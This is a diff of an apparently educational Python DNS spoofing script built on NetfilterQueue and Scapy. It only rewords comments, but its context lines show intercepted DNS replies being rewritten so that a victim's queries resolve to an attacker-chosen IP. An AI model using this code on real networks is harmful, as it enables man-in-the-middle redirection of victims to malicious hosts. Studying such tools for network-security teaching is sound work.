@@ -162,7 +162,7 @@ def dns_spoof():
     # Using "queue" we can now access the packets matching the iptables rule.
     queue = NetfilterQueue()
     try:
-        # Bind the queue number to the method process_packet().
+        # Bind the queue number and the method process_packet() to the queue.
         queue.bind(QUEUE_NUM, process_packet)
          # Start the queue, we now start receiving packets.
         queue.run()
@@ -208,7 +208,8 @@ def modify_packet(packet):
     # If qname is in the dictionary "dns_hosts", the IP address needs to be replaced.
     # Hence we craft a new reply packet overriding the original reply.
     # We set the rdata for the IP we want to redirect the victim to.
-    # So if qname == url_webpage, then url_webpage will be mapped to the corresponding spoofing IP address "ip_dns_spoof" from the dictionary "dns_hosts".
+    # So the qname is again set to url_webpage and the rdata (corresponding IP address) is set to the matching IP address from the dictionary ""dns_hosts".
+    # Now, the url_webpage will be mapped to the corresponding spoofing IP address "ip_dns_spoof" from the dictionary "dns_hosts".
     packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname]) # rrname: record name, rdata: record data
     # set the answer count to 1, indicating that the number of items in the answer section is equal to 1.
     packet[DNS].ancount = 1
